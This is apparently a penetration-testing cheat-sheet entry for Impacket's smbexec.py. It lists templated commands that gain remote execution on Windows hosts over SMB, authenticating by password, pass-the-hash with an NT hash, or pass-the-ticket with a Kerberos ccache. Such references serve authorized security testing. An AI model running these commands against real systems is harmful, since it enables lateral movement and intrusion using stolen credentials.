# smbexec (imp)

%  windows, impacket-exec, smb


## username
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service 'BTOBTO' (using temp bat files via SMB)
```
smbexec.py '<domain>/<user>:<password>'@<ip>
```

## pth
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service 'BTOBTO' (using temp bat files via SMB)
```
smbexec.py -hashes :<nt_hash> <domain>/<user>@<ip>
```

## ptt
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
```
export KRB5CCNAME=<ccache>; smbexec.py -dc-ip <dc_ip> -target-ip <ip> -no-pass -k <domain>/<user>@<target_name>
```
